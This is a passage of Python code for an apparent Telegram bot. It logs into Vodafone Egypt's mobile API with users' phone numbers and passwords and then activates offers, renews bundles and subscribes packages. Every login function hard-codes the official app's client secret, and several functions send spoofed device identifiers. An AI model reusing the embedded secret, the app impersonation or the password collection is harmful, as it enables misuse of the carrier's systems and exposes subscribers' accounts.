        result = request_note_package_loan(token, phone, selected_package)
        
        if result['success']:
            return True, f"✅ تم الاشتراك في {selected_package['name']} بنجاح!\n\n📱 الرقم: `{phone}`\n💰 السعر: {selected_package['value']} جنيه\n\nالباقة ستظهر في اشتراكاتك وتتفعل عند الشحن"
        else:
            return False, f"❌ {result['message']}"
            
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

# ==================== وظائف عروض 365 ====================
def get_auth_token_offers(number, password):
    """الحصول على توكن المصادقة"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    payload = {
        'grant_type': "password",
        'username': number,
        'password': password,
        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        'client_id': "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'digitalId': "25VT5Q5QWG8DK",
        'device-id': "b26ba335813fad21"
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        if response.status_code == 200:
            data = response.json()
            return {"success": True, "token": data.get('access_token')}
        return {"success": False, "message": "الرقم أو كلمة السر غير صحيحة"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def get_available_offers(token, number):
    """جلب العروض المتاحة"""
    url = "https://mobile.vodafone.com.eg/services/dxl/promo/promotion"
    
    params = {
        '@type': "Promo",
        '$.context.type': "offerstab"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Connection': "Keep-Alive",
        'channel': "MOBILE",
        'useCase': "Promo",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'msisdn': number,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        if response.status_code == 200:
            return response.json()
        return None
    except Exception:
        return None

def parse_offers(offers):
    """تحليل العروض"""
    if not offers:
        return []
    
    available_offers = []
    
    for i, offer in enumerate(offers, 1):
        try:
            description = offer.get('description', '')
            name = offer.get('name', '')
            offer_id = offer.get('id', '')
            
            chars = {}
            for item in offer.get('characteristics', []):
                name_key = item.get('name', '')
                value = item.get('value', '')
                chars[name_key] = value
            
            original_price = float(chars.get('bundleOriginalFees', 0) or 0)
            quota = float(chars.get('totalQuota', 0) or 0)
            
            discounted_price = 0
            if offer.get('pattern') and len(offer['pattern']) > 0:
                pattern = offer['pattern'][0]
                if pattern.get('price'):
                    discounted_price = float(pattern['price'].get('value', 0) or 0)
            
            long_script = chars.get('LongScript_Assignment', '')
            activation_code = ""
            if '*2' in long_script:
                code_start = long_script.find('*2')
                code_end = long_script.find('#', code_start)
                if code_end != -1:
                    activation_code = long_script[code_start:code_end+1]
            
            available_offers.append({
                'index': i,
                'description': description,
                'name': name,
                'offer_id': offer_id,
                'original_price': original_price,
                'discounted_price': discounted_price,
                'quota': quota,
                'activation_code': activation_code
            })
        except:
            continue
    
    return available_offers

def subscribe_to_offer(token, number, offer_id):
    """الاشتراك في عرض محدد"""
    url = f"https://mobile.vodafone.com.eg/services/dxl/promo/promotion/{offer_id}"
    
    payload = {
        "channel": {"id": "0"},
        "characteristics": [{"name": "Param6", "value": "0"}],
        "context": {"type": "offerstabV2"},
        "@type": "Promo"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8",
        'channel': "MOBILE",
        'useCase': "Promo",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'msisdn': number,
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.patch(url, json=payload, headers=headers, timeout=30)
        if response.status_code in [200, 201, 204]:
            return {"success": True, "message": "✅ تم تفعيل العرض بنجاح!"}
        return {"success": False, "message": f"فشل التفعيل: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def run_offers_365(phone, password):
    """تشغيل عروض 365"""
    try:
        auth_result = get_auth_token_offers(phone, password)
        if not auth_result['success']:
            return False, auth_result['message'], []
        
        token = auth_result['token']
        offers = get_available_offers(token, phone)
        if not offers:
            return False, "لا توجد عروض متاحة", []
        
        parsed_offers = parse_offers(offers)
        if not parsed_offers:
            return False, "لا توجد عروض متاحة", []
        
        return True, "تم جلب العروض بنجاح", parsed_offers
    except Exception as e:
        return False, str(e), []

def run_subscribe_offer(phone, password, offer_id):
    """الاشتراك في عرض"""
    try:
        auth_result = get_auth_token_offers(phone, password)
        if not auth_result['success']:
            return False, auth_result['message']
        
        token = auth_result['token']
        result = subscribe_to_offer(token, phone, offer_id)
        return result['success'], result['message']
    except Exception as e:
        return False, str(e)

# ==================== وظائف تجديد الباقة ====================
def renew_flex_login(number, password):
    """تسجيل الدخول لتجديد الباقة"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    payload = {
        'grant_type': "password",
        'username': number,
        'password': password,
        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        'client_id': "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'digitalId': "2BHAXCXG8IHJZ",
        'device-id': "b26ba335813fad21"
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        if response.status_code == 200:
            data = response.json()
            return {"success": True, "token": data['access_token']}
        return {"success": False, "message": "فشل تسجيل الدخول"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def get_flex_products_mobile(msisdn, token):
    """جلب منتجات Flex"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    
    params = {
        'relatedParty.id': msisdn,
        '@type': "FlexProfile"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "FlexProfile",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2026.1.1",
        'x-agent-build': "1090",
        'msisdn': msisdn,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        if response.status_code == 200:
            return response.json()
        return None
    except Exception:
        return None

def find_main_bundle_auto(products):
    """البحث عن الباقة الرئيسية"""
    main_bundles = []
    
    for product in products:
        if product.get('productPrice'):
            product_id = product.get('id')
            product_name = product.get('productSpecification', {}).get('name', '')
            enc_id = product.get('productOffering', {}).get('encProductId')
            
            prices = []
            for price in product.get('productPrice', []):
                if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                    prices.append({
                        'value': price['price']['taxIncludedAmount']['value'],
                        'type': price.get('priceType'),
                        'period': price.get('recurringChargePeriod')
                    })
            
            bundle_info = {
                'id': product_id,
                'name': product_name,
                'encProductId': enc_id,
                'prices': prices
            }
            main_bundles.append(bundle_info)
    
    if not main_bundles:
        return None
    
    selected_bundle = None
    for bundle in main_bundles:
        bundle_id = bundle['id']
        bundle_name = bundle['name']
        flex_pattern = r'Flex_20\d{2}_\d+'
        if re.search(flex_pattern, bundle_id) or any(keyword in bundle_name for keyword in ['فليكس', 'Flex', 'باقة']):
            selected_bundle = bundle
            break
    
    if not selected_bundle and main_bundles:
        selected_bundle = sorted(main_bundles, key=lambda x: float(x['prices'][0]['value']) if x['prices'] else 0, reverse=True)[0]
    
    return selected_bundle

def renew_flex_bundle_mobile(msisdn, token, bundle):
    """تجديد باقة Flex"""
    bundle_id = bundle['id']
    enc_product_id = bundle['encProductId']
    
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "repurchase",
            "product": {
                "relatedParty": [{"id": msisdn, "name": "MSISDN", "role": "Subscriber"}],
                "id": bundle_id,
                "encProductId": enc_product_id
            }
        }],
        "@type": "FlexRenew"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductOrderingManagementHost",
        'useCase': "FlexRenew",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2026.1.1",
        'x-agent-build': "1090",
        'msisdn': msisdn,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        
        if response.status_code == 200:
            return {"success": True, "message": "✅ تم تجديد الباقة بنجاح!"}
        elif response.status_code == 400:
            try:
                result = response.json()
                error_reason = result.get('reason', '')
                if "Grace period" in error_reason:
                    return {"success": False, "message": "الرقم في فترة السماح (لا يوجد رصيد كافٍ)"}
                return {"success": False, "message": f"فشل التجديد: {error_reason}"}
            except:
                return {"success": False, "message": "فشل التجديد"}
        return {"success": False, "message": f"خطأ: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def run_renew_bundle(phone, password):
    """تشغيل تجديد الباقة"""
    try:
        auth_result = renew_flex_login(phone, password)
        if not auth_result['success']:
            return False, auth_result['message']
        
        token = auth_result['token']
        products = get_flex_products_mobile(phone, token)
        if not products:
            return False, "فشل جلب معلومات الباقات"
        
        selected_bundle = find_main_bundle_auto(products)
        if not selected_bundle:
            return False, "لم يتم العثور على باقة رئيسية"
        
        result = renew_flex_bundle_mobile(phone, token, selected_bundle)
        return result['success'], result['message']
    except Exception as e:
        return False, str(e)

# ==================== وظائف عرض النت (الشهر الثاني) ====================
def mi_login(number, password):
    """تسجيل الدخول لعرض MI"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    payload = {
        'grant_type': "password",
        'username': number,
        'password': password,
        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        'client_id': "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "Realme RMX3871",
        'x-agent-version': "2026.2.3",
        'x-agent-build': "1117",
        'digitalId': "2AV3LCEH954GW",
        'device-id': "060372c24b51d07a"
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        if response.status_code == 200:
            data = response.json()
            return {"success": True, "token": data.get('access_token')}
        return {"success": False, "message": "الرقم أو كلمة السر غير صحيحة"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def get_mi_offer(token, msisdn):
    """جلب عرض MI"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    
    params = {
        'relatedParty.id': msisdn,
        '@type': "AllInOne",
        'relatedParty.name': "SubscriptionManagement"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "AllInOne",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "060372c24b51d07a",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Realme RMX3871",
        'x-agent-version': "2026.2.3",
        'x-agent-build': "1117",
        'msisdn': msisdn,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        data = response.json()
        
        for item in data:
            if item.get('id') == 'MI_XC_CMBO_FlexActive_400' or (item.get('@type') == 'MI' and 'MI_' in item.get('id', '')):
                enc_product_id = None
                if 'productOffering' in item and 'encProductId' in item['productOffering']:
                    enc_product_id = item['productOffering']['encProductId']
                
                price_info = {}
                if 'productPrice' in item:
                    for price in item['productPrice']:
                        if price.get('id') == 'OPT-IN':
                            for char in price.get('priceCharacteristic', []):
                                if char.get('name') == 'amountToPay':
                                    price_info['amountToPay'] = char.get('value')
                                elif char.get('name') == 'discount':
                                    price_info['discount'] = char.get('value')
                                elif char.get('name') == 'bundleFees':
                                    price_info['bundleFees'] = char.get('value')
                
                renewal_date = None
                for char in item.get('characteristic', []):
                    if char.get('name') == 'RenewalDate':
                        renewal_date = char.get('value')
                
                return {
                    'id': item.get('id'),
                    'encProductId': enc_product_id,
                    'price_info': price_info,
                    'renewal_date': renewal_date
                }
        
        return None
    except Exception:
        return None

def activate_mi_offer(token, msisdn, offer_data):
    """تفعيل عرض MI"""
    url = "https://mobile.vodafone.com.eg/services/dxl/orderor/productOrder"
    
    payload = {
        "payment": [{"characteristics": [], "@type": "balance"}],
        "productOrderItem": [{
            "characteristics": [
                {"name": "MSISDN", "@type": "receiver", "value": f"2{msisdn}" if not msisdn.startswith('2') else msisdn},
                {"name": "MSISDN", "@type": "sender", "value": f"2{msisdn}" if not msisdn.startswith('2') else msisdn}
            ],
            "itemTotalPrice": [{
                "price": {
                    "taxIncludedAmount": {
                        "unit": "EGP",
                        "value": float(offer_data['price_info'].get('amountToPay', 260))
                    }
                }
            }],
            "product": {
                "id": offer_data['id'],
                "productCharacteristic": [{"@type": "token", "value": offer_data['encProductId'], "valueType": "string"}],
                "type": "product"
            },
            "@type": "product"
        }],
        "@type": "paymentMI"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "060372c24b51d07a",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Realme RMX3871",
        'x-agent-version': "2026.2.3",
        'x-agent-build': "1117",
        'msisdn': msisdn,
        'Accept-Language': "ar",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        if response.status_code == 200:
            return {"success": True, "message": "✅ تم تفعيل العرض بنجاح!"}
        return {"success": False, "message": f"فشل التفعيل: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def run_mi_offer(phone, password):
    """تشغيل عرض MI"""
    try:
        auth_result = mi_login(phone, password)
        if not auth_result['success']:
            return False, auth_result['message'], None
        
        token = auth_result['token']
        offer = get_mi_offer(token, phone)
        if not offer:
            return False, "لا يوجد عرض MI متاح", None
        
        return True, "تم جلب العرض بنجاح", offer
    except Exception as e:
        return False, str(e), None

def run_activate_mi(phone, password, offer_data):
    """تفعيل عرض MI"""
    try:
        auth_result = mi_login(phone, password)
        if not auth_result['success']:
            return False, auth_result['message']
        
        token = auth_result['token']
        result = activate_mi_offer(token, phone, offer_data)
        return result['success'], result['message']
    except Exception as e:
        return False, str(e)

# ==================== وظائف خدمة المكالمات التوثيقية ====================
def verification_login(number, password):
    """تسجيل الدخول لخدمة المكالمات التوثيقية"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    data = {
        "grant_type": "password",
        "username": number,
        "password": password,
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        "client_id": "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=30)
        if response.status_code == 200:
            token_data = response.json()
            return {"success": True, "token": token_data.get("access_token")}
        return {"success": False, "message": "الرقم أو كلمة المرور غير صحيحة"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def activate_verification_service(token, msisdn):
    """تفعيل خدمة المكالمات التوثيقية"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "add",
            "product": {
                "characteristic": [
                    {"name": "LangId", "value": "ar"},
                    {"name": "ExecutionType", "value": "Sync"}
                ],
                "id": "TwoFactorAuthentication_Service",
                "relatedParty": [{"id": msisdn, "name": "MSISDN", "role": "Subscriber"}]
            }
        }],
        "@type": "TwoFactorAuthentication"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "7be546fe335911d2",
        'x-agent-operatingsystem': "13",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A515F",
        'x-agent-version': "2025.11.1",
        'x-agent-build': "1063",
        'msisdn': msisdn,
        'Accept-Language': "ar",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=30)
        if response.status_code in [200, 201, 202]:
            return {"success": True, "message": "✅ تم تفعيل خدمة المكالمات التوثيقية بنجاح!"}
        return {"success": False, "message": f"فشل التفعيل: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def run_verification_service(phone, password):
    """تشغيل خدمة المكالمات التوثيقية"""
    try:
        auth_result = verification_login(phone, password)
        if not auth_result['success']:
            return False, auth_result['message']
        
        token = auth_result['token']
        result = activate_verification_service(token, phone)
        return result['success'], result['message']
    except Exception as e:
        return False, str(e)

# ==================== وظائف باقات Plus ====================
def plus_login(number, password):
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    data = {
        "grant_type": "password",
        "username": number,
        "password": password,
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        "client_id": "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
    }
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=30)
        if response.status_code == 200:
            token_data = response.json()
            return {"success": True, "token": token_data.get("access_token")}
        return {"success": False, "message": "الرقم أو كلمة المرور غير صحيحة"}
    except Exception as e:
        return {"success": False, "message": f"خطأ: {str(e)}"}

def get_plus_packages(token, phone):
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': phone,
        'Content-Type': 'application/json',
        'Accept-Language': 'ar',
    }
    
    params = {
        'customerAccountId': phone,
        'type': 'MIProducts',
    }
    
    try:
        response = requests.get(
            'https://mobile.vodafone.com.eg/services/dxl/epo/eligibleProductOffering',
            params=params,
            headers=headers,
            timeout=30
        )
        if response.status_code == 200:
            return response.json()
        return None
    except Exception:
        return None

def parse_plus_packages(data):
    if not data:
        return []
    
    plus_packages = []
    index = 1
    
    for item in data:
        if 'parts' in item and 'productOffering' in item['parts']:
            offerings = item['parts']['productOffering']
            if not isinstance(offerings, list):
                offerings = [offerings]
            
            for offering in offerings:
                name = offering.get('name', '')
                
                if 'بلص' in name or 'Plus' in name or 'plus' in name.lower():
                    package = {
                        'index': index,
                        'name': name,
                        'id': '',
                        'encProductId': '',
                        'price': 0,
                        'quota': 'غير معروف',
                        'duration': 'غير معروف'
                    }
                    
                    id_list = offering.get('id', [])
                    if isinstance(id_list, list):
                        for id_item in id_list:
                            if id_item.get('schemeName') == 'CommercialID':
                                package['id'] = id_item.get('value', '')
                            elif id_item.get('schemeName') == 'EncProductID':
                                package['encProductId'] = id_item.get('value', '')
                    
                    price_list = offering.get('price', [])
                    if isinstance(price_list, list):
                        for price_item in price_list:
                            if 'originalPrice' in price_item and 'value' in price_item['originalPrice']:
                                package['price'] = price_item['originalPrice']['value']
                                break
                    
                    spec = offering.get('specification', {})
                    char_list = spec.get('characteristicsValue', [])
                    if isinstance(char_list, list):
                        for char in char_list:
                            if char.get('characteristicName') == 'QUOTA':
                                value = char.get('value', '')
                                unit = char.get('type', 'MB')
                                package['quota'] = f"{value} {unit}"
                            elif char.get('characteristicName') == 'DURATION':
                                package['duration'] = char.get('value', 'غير معروف')
                    
                    if package['price'] > 0:
                        plus_packages.append(package)
                        index += 1
    
    return plus_packages

def activate_plus_package(token, phone, package):
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': phone,
        'Content-Type': 'application/json',
        'Accept-Language': 'ar',
    }
    
    json_data = {
        'channel': {'name': 'MobileApp'},
        'orderItem': [{
            'action': 'add',
            'product': {
                'characteristic': [
                    {'name': 'LangId', 'value': 'ar'},
                    {'name': 'ExecutionType', 'value': 'Sync'},
                    {'name': 'DropAddons', 'value': 'False'},
                    {'name': 'OneStepMigrationFlag', 'value': 'Y'},
                    {'name': 'Journey', 'value': 'MI_ELigibility'},
                ],
                'encProductId': package['encProductId'],
                'id': package['id'],
                'relatedParty': [{'id': phone, 'name': 'MSISDN', 'role': 'Subscriber'}],
                '@type': 'MI',
            },
            'eCode': 0,
        }],
        '@type': 'MIProfile',
    }
    
    try:
        response = requests.post(
            'https://mobile.vodafone.com.eg/services/dxl/pom/productOrder', 
            headers=headers, 
            json=json_data,
            timeout=30
        )
        if response.status_code in [200, 201, 202]:
            return {"success": True, "message": f"تم تفعيل {package['name']} بنجاح", "price": package['price'], "quota": package['quota'], "duration": package['duration']}
        return {"success": False, "message": f"فشل التفعيل: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": f"خطأ: {str(e)}"}

def show_plus_packages_markup(packages):
    markup = types.InlineKeyboardMarkup(row_width=1)
    for pkg in packages:
        markup.add(types.InlineKeyboardButton(
            text=f"{pkg['name']} - {pkg['price']} جنيه",
            callback_data=f"plus_package_{pkg['index']}"
        ))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['back']} رجوع", callback_data="back_to_main"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action"))
    return markup

# ==================== وظائف باقات اكستريم ====================
def extreme_login(number, password):
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    data = {
        "grant_type": "password",
        "username": number,
        "password": password,
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        "client_id": "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
    }
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=30)
        if response.status_code == 200:
            token_data = response.json()
            return {"success": True, "token": token_data.get("access_token")}
        return {"success": False, "message": "الرقم أو كلمة المرور غير صحيحة"}
    except Exception as e:
        return {"success": False, "message": f"خطأ: {str(e)}"}

def get_extreme_packages(token, phone):
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': phone,
        'Content-Type': 'application/json',
        'Accept-Language': 'ar',
    }
    
    params = {
        'customerAccountId': phone,
        'type': 'MIProducts',
    }
    
    try:
        response = requests.get(
            'https://mobile.vodafone.com.eg/services/dxl/epo/eligibleProductOffering',
            params=params,
            headers=headers,
            timeout=30
        )
        if response.status_code == 200:
            return response.json()
        return None
    except Exception:
        return None

def parse_extreme_packages(data):
    if not data:
        return []
    
    extreme_packages = []
    index = 1
    
    for item in data:
        if 'parts' in item and 'productOffering' in item['parts']:
            offerings = item['parts']['productOffering']
            if not isinstance(offerings, list):
                offerings = [offerings]
            
            for offering in offerings:
                name = offering.get('name', '')
                
                if 'إكستريم' in name or 'extreme' in name.lower():
                    package = {
                        'index': index,
                        'name': name,
                        'id': '',
                        'encProductId': '',
                        'price': 0,
                        'quota': 'غير معروف',
                        'duration': 'غير معروف'
                    }
                    
                    id_list = offering.get('id', [])
                    if isinstance(id_list, list):
                        for id_item in id_list:
                            if id_item.get('schemeName') == 'CommercialID':
                                package['id'] = id_item.get('value', '')
                            elif id_item.get('schemeName') == 'EncProductID':
                                package['encProductId'] = id_item.get('value', '')
                    
                    price_list = offering.get('price', [])
                    if isinstance(price_list, list):
                        for price_item in price_list:
                            if 'originalPrice' in price_item and 'value' in price_item['originalPrice']:
                                package['price'] = price_item['originalPrice']['value']
                                break
                    
                    spec = offering.get('specification', {})
                    char_list = spec.get('characteristicsValue', [])
                    if isinstance(char_list, list):
                        for char in char_list:
                            if char.get('characteristicName') == 'QUOTA':
                                value = char.get('value', '')
                                unit = char.get('type', 'MB')
                                package['quota'] = f"{value} {unit}"
                            elif char.get('characteristicName') == 'DURATION':
                                package['duration'] = char.get('value', 'غير معروف')
                    
                    if package['price'] > 0:
                        extreme_packages.append(package)
                        index += 1
    
    return extreme_packages

def activate_extreme_package(token, phone, package):
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': phone,
        'Content-Type': 'application/json',
        'Accept-Language': 'ar',
    }
    
    json_data = {
        'channel': {'name': 'MobileApp'},
        'orderItem': [{
            'action': 'add',
            'product': {
                'characteristic': [
                    {'name': 'LangId', 'value': 'ar'},
                    {'name': 'ExecutionType', 'value': 'Sync'},
                    {'name': 'DropAddons', 'value': 'False'},
                    {'name': 'OneStepMigrationFlag', 'value': 'Y'},
                    {'name': 'Journey', 'value': 'MI_ELigibility'},
                ],
                'encProductId': package['encProductId'],
                'id': package['id'],
                'relatedParty': [{'id': phone, 'name': 'MSISDN', 'role': 'Subscriber'}],
                '@type': 'MI',
            },
            'eCode': 0,
        }],
        '@type': 'MIProfile',
    }
    
    try:
        response = requests.post(
            'https://mobile.vodafone.com.eg/services/dxl/pom/productOrder', 
            headers=headers, 
            json=json_data,
            timeout=30
        )
        if response.status_code in [200, 201, 202]:
            return {"success": True, "message": f"تم تفعيل {package['name']} بنجاح", "price": package['price'], "quota": package['quota'], "duration": package['duration']}
        return {"success": False, "message": f"فشل التفعيل: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": f"خطأ: {str(e)}"}

def show_extreme_packages_markup(packages):
    markup = types.InlineKeyboardMarkup(row_width=1)
    for pkg in packages:
        markup.add(types.InlineKeyboardButton(
            text=f"{pkg['name']} - {pkg['price']} جنيه",
            callback_data=f"extreme_package_{pkg['index']}"
        ))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['back']} رجوع", callback_data="back_to_main"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action"))
    return markup

# ==================== وظائف باقات التطبيقات ====================
def apps_login(number, password):
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    data = {
        "grant_type": "password",
        "username": number,
        "password": password,
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        "client_id": "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
    }
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=30)
        if response.status_code == 200:
            token_data = response.json()
            return {"success": True, "token": token_data.get("access_token")}
        return {"success": False, "message": "الرقم أو كلمة المرور غير صحيحة"}
    except Exception as e:
        return {"success": False, "message": f"خطأ: {str(e)}"}

def get_apps_packages(token, phone):
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
